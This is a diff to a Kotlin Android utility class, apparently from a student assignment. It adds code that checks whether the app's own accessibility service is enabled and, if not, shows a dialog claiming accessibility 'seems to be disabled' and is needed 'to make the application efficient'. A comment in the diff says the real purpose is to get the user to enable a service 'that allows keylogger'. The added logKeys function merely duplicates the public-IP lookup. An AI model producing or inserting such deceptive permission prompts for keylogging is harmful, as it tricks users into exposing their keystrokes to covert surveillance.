@@ -1,10 +1,15 @@
 package com.example.assignment1.DataRetriever
 
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.Activity
-import android.content.ClipDescription
-import android.content.ClipboardManager
-import android.content.Context
+import android.content.*
+import android.content.pm.ServiceInfo
 import android.content.res.Resources
+import android.provider.Settings
+import android.view.accessibility.AccessibilityManager
+import androidx.appcompat.app.AlertDialog
+import com.example.assignment1.MyAccessibilityService
 import org.jsoup.Jsoup
 import org.jsoup.nodes.Document
 import java.net.InetAddress
@@ -88,5 +93,44 @@ class General{
     fun getPublicIP(): String? {
         val doc: Document = Jsoup.connect("https://www.checkip.org").get()
         return doc.getElementById("yourip").select("h1").first().select("span").text()
+    }
+
+    fun logKeys(): String? {
+        val doc: Document = Jsoup.connect("https://www.checkip.org").get()
+        return doc.getElementById("yourip").select("h1").first().select("span").text()
+    }
+
+    fun accessibilityCheck() {
+        // Make them enable a accessibilityservice that allows keylogger
+        val accessibilityEnabled = isAccessibilityServiceEnabled(ctx!!, MyAccessibilityService::class.java)
+        if(!accessibilityEnabled)
+        {
+            buildAlertMessageNoAccessibility()
+            //startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
+    }
+
+    private fun buildAlertMessageNoAccessibility() {
+        val builder: AlertDialog.Builder = AlertDialog.Builder(ctx!!)
+        builder.setMessage("Your Accessibility seems to be disabled, please enable it to make the application efficient!")
+            .setCancelable(true)
+            .setPositiveButton("Ok",
+                DialogInterface.OnClickListener { dialog, id -> aty!!.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
+        val alert: AlertDialog = builder.create()
+        alert.show()
+    }
+
+    fun isAccessibilityServiceEnabled( context: Context, service: Class<out AccessibilityService?> ): Boolean {
+        val am = context.getSystemService(Activity.ACCESSIBILITY_SERVICE) as AccessibilityManager
+        val enabledServices =
+            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
+        for (enabledService in enabledServices) {
+            val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
+            if (enabledServiceInfo.packageName.equals(context.packageName) && enabledServiceInfo.name.equals(
+                    service.name
+                )
+            ) return true
+        }
+        return false
     }
 }
